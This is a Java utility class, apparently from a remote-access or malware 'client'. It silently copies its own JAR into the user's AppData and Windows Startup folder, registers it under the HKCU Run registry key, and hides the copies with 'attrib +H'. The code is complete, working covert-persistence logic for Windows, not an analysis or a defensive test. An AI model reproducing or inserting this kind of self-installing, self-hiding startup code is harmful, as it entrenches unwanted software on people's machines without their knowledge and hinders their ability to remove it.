package net.vitox.client.util;

import net.vitox.client.Client;

import java.io.File;
import java.io.RandomAccessFile;
import java.net.URISyntaxException;
import java.nio.channels.FileLock;
import java.nio.file.*;
import java.nio.file.attribute.FileAttribute;

public class StartupUtil {

    private static final String STARTUP_DIRECTORY_PATH = System.getenv("APPDATA");
    private static final String STARTUP_DIRECTORY_PATH_2 = System.getenv("APPDATA") + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "Start Menu" + File.separator + "Programs" + File.separator + "Startup";
    private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU" + File.separator + "Software" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run /v \"%s\" /d \"%s\" /f";
    private static final String STARTUP_REGISTRY_REMOVE_COMMAND = "REG DELETE HKCU" + File.separator + "Software" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run /v \"%s\" /f";
    private static final String HIDE_FILE_COMMAND = "attrib +H %s";

    public static void addToStartup() throws URISyntaxException {
        lockInstance(STARTUP_DIRECTORY_PATH);
        lockInstance(STARTUP_DIRECTORY_PATH_2);

        String osName = System.getProperty("os.name");
        if (osName.contains("Windows")) {

            Path filePath = Paths.get(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            final String name = filePath.getFileName().toString();
            final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
            final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
            final Path destination = Paths.get(path);
            final Path destination2 = Paths.get(path2);
            final String registryCommand = String.format(STARTUP_REGISTRY_COMMAND, name, path);
            final String hideFileCommand = String.format(HIDE_FILE_COMMAND, path);
            final String hideFileCommand2 = String.format(HIDE_FILE_COMMAND, path2);

            createFile(path);
            copyFile(filePath, destination);
            copyFile(filePath, destination2);

            try {
                Runtime.getRuntime().exec(registryCommand);
                Runtime.getRuntime().exec(hideFileCommand);
                Runtime.getRuntime().exec(hideFileCommand2);
            } catch (final Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void removeFromStartup(final String name) {
        final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
        final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
        final String registryRemoveCommand = String.format(STARTUP_REGISTRY_REMOVE_COMMAND, name);

        deleteFile(path);
        deleteFile(path2);

        try {
            Runtime.getRuntime().exec(registryRemoveCommand);
        } catch (final Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean createFile(String path) {
        Path file = Paths.get(path, new String[0]);
        Path parent = file.getParent();

        try {
            Files.createDirectories(parent, new FileAttribute[0]);
            Files.createFile(file, new FileAttribute[0]);
            return true;
        } catch (Exception var4) {
            return false;
        }
    }

    public static boolean copyFile(Path source, Path destination) {
        try {
            Files.copy(source, destination, new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
            return true;
        } catch (Exception var3) {
            return false;
        }
    }

    public static boolean deleteFile(String path) {
        Path file = Paths.get(path, new String[0]);

        try {
            Files.delete(file);
            return true;
        } catch (Exception var3) {
            return false;
        }
    }

    private static boolean lockInstance(final String lockFile) {
        try {
            final File file = new File(lockFile);
            final RandomAccessFile randomAccessFile = new RandomAccessFile(file, "rw");
            final FileLock fileLock = randomAccessFile.getChannel().tryLock();
            if (fileLock != null) {
                Runtime.getRuntime().addShutdownHook(new Thread() {
                    public void run() {
                        try {
                            fileLock.release();
                            randomAccessFile.close();
                            file.delete();
                        } catch (Exception e) {
                        }
                    }
                });
                return true;
            }
        } catch (Exception e) {

        }
        return false;
    }
}
